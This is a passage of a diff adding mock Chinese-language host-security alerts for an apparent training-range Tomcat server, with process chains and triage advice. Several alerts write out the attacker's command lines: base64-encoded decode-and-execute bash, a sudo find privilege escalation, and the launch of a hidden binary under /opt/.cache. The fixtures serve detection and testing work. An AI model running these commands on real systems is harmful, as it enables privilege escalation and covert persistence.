+          "ValueDisplay": "bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgY2htb2QgNzU1IC9vcHQvLmNhY2hlLy5qYXZhLXVwZGF0ZXIgXDs=}|{base64,-d}|bash"
+        },
+        {
+          "NameDisplay": "进程路径",
+          "Type": "text",
+          "Value": "-",
+          "ValueDisplay": "-"
+        },
+        {
+          "NameDisplay": "进程ID",
+          "Type": "text",
+          "Value": "17982",
+          "ValueDisplay": "17982"
+        },
+        {
+          "NameDisplay": "父进程文件路径",
+          "Type": "text",
+          "Value": "-",
+          "ValueDisplay": "-"
+        },
+        {
+          "NameDisplay": "父进程命令行",
+          "Type": "text",
+          "Value": "-",
+          "ValueDisplay": "-"
+        },
+        {
+          "NameDisplay": "父进程ID",
+          "Type": "text",
+          "Value": "4189",
+          "ValueDisplay": "4189"
+        },
+        {
+          "NameDisplay": "进程链",
+          "Type": "html",
+          "Value": "<pre><code>-[4182]  /bin/sh /opt/tomcat/bin/catalina.sh start\n    -[4189]  /usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start\n</code></pre>\n",
+          "ValueDisplay": "<pre><code>-[4182]  /bin/sh /opt/tomcat/bin/catalina.sh start\n    -[4189]  /usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start\n</code></pre>\n"
+        },
+        {
+          "NameDisplay": "描述",
+          "Type": "text",
+          "Value": "该进程的命令行与正常进程有较大的区别，有可能与恶意软件或黑客有关。",
+          "ValueDisplay": "该进程的命令行与正常进程有较大的区别，有可能与恶意软件或黑客有关。"
+        },
+        {
+          "NameDisplay": "处置建议",
+          "Type": "html",
+          "Value": "<ol>\n<li>首先验证告警的准确性。根据告警中的IOC（例如命令行，文件路径、网络等）结合机器上的异常行为或其他告警，判断告警是否为误报。如果是则忽略或加白该告警；如果不是则及时进行处置，避免恶意行为产生进一步的影响。</li>\n<li>调查告警的产生根因。根据告警详情或其他告警的事件说明，还原机器被入侵的原因，修复相关漏洞或清理相关后门，防止攻击者的二次入侵。</li>\n</ol>\n",
+          "ValueDisplay": "<ol>\n<li>首先验证告警的准确性。根据告警中的IOC（例如命令行，文件路径、网络等）结合机器上的异常行为或其他告警，判断告警是否为误报。如果是则忽略或加白该告警；如果不是则及时进行处置，避免恶意行为产生进一步的影响。</li>\n<li>调查告警的产生根因。根据告警详情或其他告警的事件说明，还原机器被入侵的原因，修复相关漏洞或清理相关后门，防止攻击者的二次入侵。</li>\n</ol>\n"
+        }
+      ],
+      "EventStatus": 1,
+      "EventSubType": "linux可疑命令执行",
+      "HasTraceInfo": true,
+      "Id": 800000004,
+      "InstanceId": "i-mock-shiro-fastjson-001",
+      "InstanceName": "range-shiro-fastjson-victim",
+      "InternetIp": "172.18.0.2",
+      "IntranetIp": "172.16.0.100",
+      "Level": "serious",
+      "Name": "进程异常行为-可疑命令执行",
+      "OccurrenceTime": "2026-04-15 13:50:25",
+      "Stages": "[\"代码执行\"]"
+    },
+    {
+      "AlarmEventName": "Java应用执行异常指令",
+      "AlarmEventNameDisplay": "Java应用执行异常指令",
+      "AlarmEventType": "进程异常行为",
+      "AlarmEventTypeDisplay": "进程异常行为",
+      "AlarmUniqueInfo": "",
+      "CanBeDealOnLine": true,
+      "DataSource": "aegis_suspicious_event",
+      "Desc": "检测模型发现您的服务器上的Java进程启动了下载恶意程序、添加后门等高危行为，很可能是因为您使用了存在漏洞的Web框架或者中间件导致。",
+      "Details": [
+        {
+          "NameDisplay": "告警原因",
+          "Type": "text",
+          "Value": "        该Java进程被利用执行异常命令。\n        \n",
+          "ValueDisplay": "        该Java进程被利用执行异常命令。\n        \n"
+        },
+        {
+          "NameDisplay": "用户名",
+          "Type": "text",
+          "Value": "tomcat",
+          "ValueDisplay": "tomcat"
+        },
+        {
+          "NameDisplay": "命令行",
+          "Type": "text",
+          "Value": "bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgY2htb2QgNzU1IC9vcHQvLmNhY2hlLy5qYXZhLXVwZGF0ZXIgXDs=}|{base64,-d}|bash",
+          "ValueDisplay": "bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgY2htb2QgNzU1IC9vcHQvLmNhY2hlLy5qYXZhLXVwZGF0ZXIgXDs=}|{base64,-d}|bash"
+        },
+        {
+          "NameDisplay": "进程路径",
+          "Type": "text",
+          "Value": "/usr/bin/bash",
+          "ValueDisplay": "/usr/bin/bash"
+        },
+        {
+          "NameDisplay": "进程ID",
+          "Type": "text",
+          "Value": "17982",
+          "ValueDisplay": "17982"
+        },
+        {
+          "NameDisplay": "父进程命令行",
+          "Type": "text",
+          "Value": "/usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start",
+          "ValueDisplay": "/usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start"
+        },
+        {
+          "NameDisplay": "父进程文件路径",
+          "Type": "text",
+          "Value": "/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.412.b08-1.el7_9.x86_64/bin/java",
+          "ValueDisplay": "/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.412.b08-1.el7_9.x86_64/bin/java"
+        },
+        {
+          "NameDisplay": "父进程ID",
+          "Type": "text",
+          "Value": "4189",
+          "ValueDisplay": "4189"
+        },
+        {
+          "NameDisplay": "进程链",
+          "Type": "html",
+          "Value": "<p>-<strong>[4182]</strong>&nbsp;&nbsp;<code>/bin/sh /opt/tomcat/bin/catalina.sh start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[4189]</strong>&nbsp;&nbsp;<code>/usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[17982]</strong>&nbsp;&nbsp;<code>bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgY2htb2QgNzU1IC9vcHQvLmNhY2hlLy5qYXZhLXVwZGF0ZXIgXDs=}|{base64,-d}|bash</code></p>\n",
+          "ValueDisplay": "<p>-<strong>[4182]</strong>&nbsp;&nbsp;<code>/bin/sh /opt/tomcat/bin/catalina.sh start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[4189]</strong>&nbsp;&nbsp;<code>/usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[17982]</strong>&nbsp;&nbsp;<code>bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgY2htb2QgNzU1IC9vcHQvLmNhY2hlLy5qYXZhLXVwZGF0ZXIgXDs=}|{base64,-d}|bash</code></p>\n"
+        },
+        {
+          "NameDisplay": "提示",
+          "Type": "text",
+          "Value": "Java应用程序创建了异常的子进程",
+          "ValueDisplay": "Java应用程序创建了异常的子进程"
+        },
+        {
+          "NameDisplay": "描述",
+          "Type": "text",
+          "Value": "Java应用程序创建了异常的子进程，通常Java应用不会创建这些进程。这有可能是攻击者利用应用存在的漏洞执行命令所导致的，也有可能是应用本身的行为。建议根据实际情况进一步判断告警的真实性。",
+          "ValueDisplay": "Java应用程序创建了异常的子进程，通常Java应用不会创建这些进程。这有可能是攻击者利用应用存在的漏洞执行命令所导致的，也有可能是应用本身的行为。建议根据实际情况进一步判断告警的真实性。"
+        },
+        {
+          "NameDisplay": "处置建议",
+          "Type": "html",
+          "Value": "<ol>\n<li>首先验证告警的准确性。根据告警中的IOC（例如命令行，文件路径、网络等）结合机器上的异常行为或其他告警，判断告警是否为误报。如果是则忽略或加白该告警；如果不是则及时进行处置，避免恶意行为产生进一步的影响。</li>\n<li>调查告警的产生根因。根据告警详情或其他告警的事件说明，还原机器被入侵的原因，修复相关漏洞或清理相关后门，防止攻击者的二次入侵。</li>\n</ol>\n",
+          "ValueDisplay": "<ol>\n<li>首先验证告警的准确性。根据告警中的IOC（例如命令行，文件路径、网络等）结合机器上的异常行为或其他告警，判断告警是否为误报。如果是则忽略或加白该告警；如果不是则及时进行处置，避免恶意行为产生进一步的影响。</li>\n<li>调查告警的产生根因。根据告警详情或其他告警的事件说明，还原机器被入侵的原因，修复相关漏洞或清理相关后门，防止攻击者的二次入侵。</li>\n</ol>\n"
+        }
+      ],
+      "EventStatus": 1,
+      "EventSubType": "Java应用执行异常指令",
+      "HasTraceInfo": true,
+      "Id": 800000006,
+      "InstanceId": "i-mock-shiro-fastjson-001",
+      "InstanceName": "range-shiro-fastjson-victim",
+      "InternetIp": "172.18.0.2",
+      "IntranetIp": "172.16.0.100",
+      "Level": "suspicious",
+      "Name": "进程异常行为-Java应用执行异常指令",
+      "OccurrenceTime": "2026-04-15 13:50:25",
+      "Stages": "[\"初始入口\"]"
+    },
+    {
+      "AlarmEventName": "可疑编码命令",
+      "AlarmEventNameDisplay": "可疑编码命令",
+      "AlarmEventType": "进程异常行为",
+      "AlarmEventTypeDisplay": "进程异常行为",
+      "AlarmUniqueInfo": "",
+      "CanBeDealOnLine": true,
+      "DataSource": "aegis_suspicious_event",
+      "Desc": "检测模型发现您的服务器上执行的进程命令行高度可疑，很有可能与木马、病毒、黑客行为有关。",
+      "Details": [
+        {
+          "NameDisplay": "数据来源",
+          "Type": "text",
+          "Value": "        进程启动触发检测\n        ",
+          "ValueDisplay": "        进程启动触发检测\n        "
+        },
+        {
+          "NameDisplay": "告警原因",
+          "Type": "text",
+          "Value": "该命令行存在高度可疑的编码特征。",
+          "ValueDisplay": "该命令行存在高度可疑的编码特征。"
+        },
+        {
+          "NameDisplay": "用户名",
+          "Type": "text",
+          "Value": "tomcat",
+          "ValueDisplay": "tomcat"
+        },
+        {
+          "NameDisplay": "命令行",
+          "Type": "text",
+          "Value": "bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgY2htb2QgNzU1IC9vcHQvLmNhY2hlLy5qYXZhLXVwZGF0ZXIgXDs=}|{base64,-d}|bash",
+          "ValueDisplay": "bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgY2htb2QgNzU1IC9vcHQvLmNhY2hlLy5qYXZhLXVwZGF0ZXIgXDs=}|{base64,-d}|bash"
+        },
+        {
+          "NameDisplay": "进程路径",
+          "Type": "text",
+          "Value": "/usr/bin/bash",
+          "ValueDisplay": "/usr/bin/bash"
+        },
+        {
+          "NameDisplay": "进程ID",
+          "Type": "text",
+          "Value": "17982",
+          "ValueDisplay": "17982"
+        },
+        {
+          "NameDisplay": "父进程文件路径",
+          "Type": "text",
+          "Value": "/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.412.b08-1.el7_9.x86_64/bin/java",
+          "ValueDisplay": "/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.412.b08-1.el7_9.x86_64/bin/java"
+        },
+        {
+          "NameDisplay": "父进程ID",
+          "Type": "text",
+          "Value": "4189",
+          "ValueDisplay": "4189"
+        },
+        {
+          "NameDisplay": "进程链",
+          "Type": "html",
+          "Value": "<p>-<strong>[4182]</strong>&nbsp;&nbsp;<code>/bin/sh /opt/tomcat/bin/catalina.sh start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[4189]</strong>&nbsp;&nbsp;<code>/usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[17982]</strong>&nbsp;&nbsp;<code>bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgY2htb2QgNzU1IC9vcHQvLmNhY2hlLy5qYXZhLXVwZGF0ZXIgXDs=}|{base64,-d}|bash</code></p>\n",
+          "ValueDisplay": "<p>-<strong>[4182]</strong>&nbsp;&nbsp;<code>/bin/sh /opt/tomcat/bin/catalina.sh start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[4189]</strong>&nbsp;&nbsp;<code>/usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[17982]</strong>&nbsp;&nbsp;<code>bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgY2htb2QgNzU1IC9vcHQvLmNhY2hlLy5qYXZhLXVwZGF0ZXIgXDs=}|{base64,-d}|bash</code></p>\n"
+        },
+        {
+          "NameDisplay": "提示",
+          "Type": "text",
+          "Value": "该进程的命令行参数中存在编码，并且解码后的内容可疑",
+          "ValueDisplay": "该进程的命令行参数中存在编码，并且解码后的内容可疑"
+        },
+        {
+          "NameDisplay": "描述",
+          "Type": "text",
+          "Value": "该进程的命令行参数中存在编码，并且解码后的内容可疑。攻击者在植入恶意代码时，有可能会先进行编码。",
+          "ValueDisplay": "该进程的命令行参数中存在编码，并且解码后的内容可疑。攻击者在植入恶意代码时，有可能会先进行编码。"
+        },
+        {
+          "NameDisplay": "处置建议",
+          "Type": "html",
+          "Value": "<ol>\n<li>首先验证告警的准确性。根据告警中的IOC（例如命令行，文件路径、网络等）结合机器上的异常行为或其他告警，判断告警是否为误报。如果是则忽略或加白该告警；如果不是则及时进行处置，避免恶意行为产生进一步的影响。</li>\n<li>调查告警的产生根因。根据告警详情或其他告警的事件说明，还原机器被入侵的原因，修复相关漏洞或清理相关后门，防止攻击者的二次入侵。</li>\n</ol>\n",
+          "ValueDisplay": "<ol>\n<li>首先验证告警的准确性。根据告警中的IOC（例如命令行，文件路径、网络等）结合机器上的异常行为或其他告警，判断告警是否为误报。如果是则忽略或加白该告警；如果不是则及时进行处置，避免恶意行为产生进一步的影响。</li>\n<li>调查告警的产生根因。根据告警详情或其他告警的事件说明，还原机器被入侵的原因，修复相关漏洞或清理相关后门，防止攻击者的二次入侵。</li>\n</ol>\n"
+        }
+      ],
+      "EventStatus": 1,
+      "EventSubType": "可疑编码命令",
+      "HasTraceInfo": true,
+      "Id": 800000009,
+      "InstanceId": "i-mock-shiro-fastjson-001",
+      "InstanceName": "range-shiro-fastjson-victim",
+      "InternetIp": "172.18.0.2",
+      "IntranetIp": "172.16.0.100",
+      "Level": "suspicious",
+      "Name": "进程异常行为-可疑编码命令",
+      "OccurrenceTime": "2026-04-15 13:50:25",
+      "Stages": "[\"防御绕过\"]"
+    },
+    {
+      "AlarmEventName": "疑似权限提升",
+      "AlarmEventNameDisplay": "疑似权限提升",
+      "AlarmEventType": "进程异常行为",
+      "AlarmEventTypeDisplay": "进程异常行为",
+      "AlarmUniqueInfo": "",
+      "CanBeDealOnLine": true,
+      "DataSource": "aegis_suspicious_event",
+      "Desc": "检测模型发现您的服务器上有进程疑似利用系统、应用漏洞来获取更高的权限，可能是攻击者在入侵过程中进行的提权行为。",
+      "Details": [
+        {
+          "NameDisplay": "提示",
+          "Type": "text",
+          "Value": "检测到尝试提升到更高的权限",
+          "ValueDisplay": "检测到尝试提升到更高的权限"
+        },
+        {
+          "NameDisplay": "告警原因",
+          "Type": "text",
+          "Value": "该命令疑似通过运行允许Sudo的程序，来获取root权限并执行恶意命令。",
+          "ValueDisplay": "该命令疑似通过运行允许Sudo的程序，来获取root权限并执行恶意命令。"
+        },
+        {
+          "NameDisplay": "用户名",
+          "Type": "text",
+          "Value": "tomcat",
+          "ValueDisplay": "tomcat"
+        },
+        {
+          "NameDisplay": "进程ID",
+          "Type": "text",
+          "Value": "18004",
+          "ValueDisplay": "18004"
+        },
+        {
+          "NameDisplay": "进程路径",
+          "Type": "text",
+          "Value": "-",
+          "ValueDisplay": "-"
+        },
+        {
+          "NameDisplay": "命令行",
+          "Type": "text",
+          "Value": "sudo find /tmp -maxdepth 0 -exec bash -c nohup /opt/.cache/.java-updater > /dev/null 2>&1 & ;",
+          "ValueDisplay": "sudo find /tmp -maxdepth 0 -exec bash -c nohup /opt/.cache/.java-updater > /dev/null 2>&1 & ;"
+        },
+        {
+          "NameDisplay": "父进程ID",
+          "Type": "text",
+          "Value": "18003",
+          "ValueDisplay": "18003"
+        },
+        {
+          "NameDisplay": "父进程路径",
+          "Type": "text",
+          "Value": "-",
+          "ValueDisplay": "-"
+        },
+        {
+          "NameDisplay": "父进程命令行",
+          "Type": "text",
+          "Value": "-",
+          "ValueDisplay": "-"
+        },
+        {
+          "NameDisplay": "进程链",
+          "Type": "html",
+          "Value": "<p>-<strong>[4182]</strong>&nbsp;&nbsp;<code>/bin/sh /opt/tomcat/bin/catalina.sh start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[4189]</strong>&nbsp;&nbsp;<code>/usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[18000]</strong>&nbsp;&nbsp;<code>bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgYmFzaCAtYyAnbm9odXAgL29wdC8uY2FjaGUvLmphdmEtdXBkYXRlciA+IC9kZXYvbnVsbCAyPiYxICYnIFw7}|{base64,-d}|bash</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[18003]</strong>&nbsp;&nbsp;<code>bash</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[18004]</strong>&nbsp;&nbsp;<code>sudo find /tmp -maxdepth 0 -exec bash -c nohup /opt/.cache/.java-updater &gt; /dev/null 2&gt;&amp;1 &amp; ;</code></p>\n",
+          "ValueDisplay": "<p>-<strong>[4182]</strong>&nbsp;&nbsp;<code>/bin/sh /opt/tomcat/bin/catalina.sh start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[4189]</strong>&nbsp;&nbsp;<code>/usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[18000]</strong>&nbsp;&nbsp;<code>bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgYmFzaCAtYyAnbm9odXAgL29wdC8uY2FjaGUvLmphdmEtdXBkYXRlciA+IC9kZXYvbnVsbCAyPiYxICYnIFw7}|{base64,-d}|bash</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[18003]</strong>&nbsp;&nbsp;<code>bash</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[18004]</strong>&nbsp;&nbsp;<code>sudo find /tmp -maxdepth 0 -exec bash -c nohup /opt/.cache/.java-updater &gt; /dev/null 2&gt;&amp;1 &amp; ;</code></p>\n"
+        },
+        {
+          "NameDisplay": "事件说明",
+          "Type": "text",
+          "Value": "检测模型发现您的服务器上有进程疑似利用系统、应用漏洞来获取更高的权限，可能是攻击者在入侵过程中进行的提权行为。",
+          "ValueDisplay": "检测模型发现您的服务器上有进程疑似利用系统、应用漏洞来获取更高的权限，可能是攻击者在入侵过程中进行的提权行为。"
+        },
+        {
+          "NameDisplay": "描述",
+          "Type": "text",
+          "Value": "检测到尝试特权提升的行为。攻击者通常在获取到低权限之后，会尝试提升到更高的权限。",
+          "ValueDisplay": "检测到尝试特权提升的行为。攻击者通常在获取到低权限之后，会尝试提升到更高的权限。"
+        },
+        {
+          "NameDisplay": "处置建议",
+          "Type": "html",
+          "Value": "<ol>\n<li>首先验证告警的准确性。根据告警中的IOC（例如命令行，文件路径、网络等）结合机器上的异常行为或其他告警，判断告警是否为误报。如果是则忽略或加白该告警；如果不是则及时进行处置，避免恶意行为产生进一步的影响。</li>\n<li>调查告警的产生根因。根据告警详情或其他告警的事件说明，还原机器被入侵的原因，修复相关漏洞或清理相关后门，防止攻击者的二次入侵。</li>\n</ol>\n",
+          "ValueDisplay": "<ol>\n<li>首先验证告警的准确性。根据告警中的IOC（例如命令行，文件路径、网络等）结合机器上的异常行为或其他告警，判断告警是否为误报。如果是则忽略或加白该告警；如果不是则及时进行处置，避免恶意行为产生进一步的影响。</li>\n<li>调查告警的产生根因。根据告警详情或其他告警的事件说明，还原机器被入侵的原因，修复相关漏洞或清理相关后门，防止攻击者的二次入侵。</li>\n</ol>\n"
+        }
+      ],
+      "EventStatus": 1,
+      "EventSubType": "疑似权限提升",
+      "HasTraceInfo": true,
+      "Id": 800000001,
+      "InstanceId": "i-mock-shiro-fastjson-001",
+      "InstanceName": "range-shiro-fastjson-victim",
+      "InternetIp": "172.18.0.2",
+      "IntranetIp": "172.16.0.100",
+      "Level": "serious",
+      "Name": "进程异常行为-疑似权限提升",
+      "OccurrenceTime": "2026-04-15 13:50:45",
+      "Stages": "[\"权限提升\"]"
+    },
+    {
+      "AlarmEventName": "Java应用执行异常指令",
+      "AlarmEventNameDisplay": "Java应用执行异常指令",
+      "AlarmEventType": "进程异常行为",
+      "AlarmEventTypeDisplay": "进程异常行为",
+      "AlarmUniqueInfo": "",
+      "CanBeDealOnLine": true,
+      "DataSource": "aegis_suspicious_event",
+      "Desc": "检测模型发现您的服务器上的Java进程启动了下载恶意程序、添加后门等高危行为，很可能是因为您使用了存在漏洞的Web框架或者中间件导致。",
+      "Details": [
+        {
+          "NameDisplay": "告警原因",
+          "Type": "text",
+          "Value": "        该Java进程被利用执行异常命令。\n        \n",
+          "ValueDisplay": "        该Java进程被利用执行异常命令。\n        \n"
+        },
+        {
+          "NameDisplay": "用户名",
+          "Type": "text",
+          "Value": "tomcat",
+          "ValueDisplay": "tomcat"
+        },
+        {
+          "NameDisplay": "命令行",
+          "Type": "text",
+          "Value": "bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgYmFzaCAtYyAnbm9odXAgL29wdC8uY2FjaGUvLmphdmEtdXBkYXRlciA+IC9kZXYvbnVsbCAyPiYxICYnIFw7}|{base64,-d}|bash",
+          "ValueDisplay": "bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgYmFzaCAtYyAnbm9odXAgL29wdC8uY2FjaGUvLmphdmEtdXBkYXRlciA+IC9kZXYvbnVsbCAyPiYxICYnIFw7}|{base64,-d}|bash"
+        },
+        {
+          "NameDisplay": "进程路径",
+          "Type": "text",
+          "Value": "/usr/bin/bash",
+          "ValueDisplay": "/usr/bin/bash"
+        },
+        {
+          "NameDisplay": "进程ID",
+          "Type": "text",
+          "Value": "18000",
+          "ValueDisplay": "18000"
+        },
+        {
+          "NameDisplay": "父进程命令行",
+          "Type": "text",
+          "Value": "/usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start",
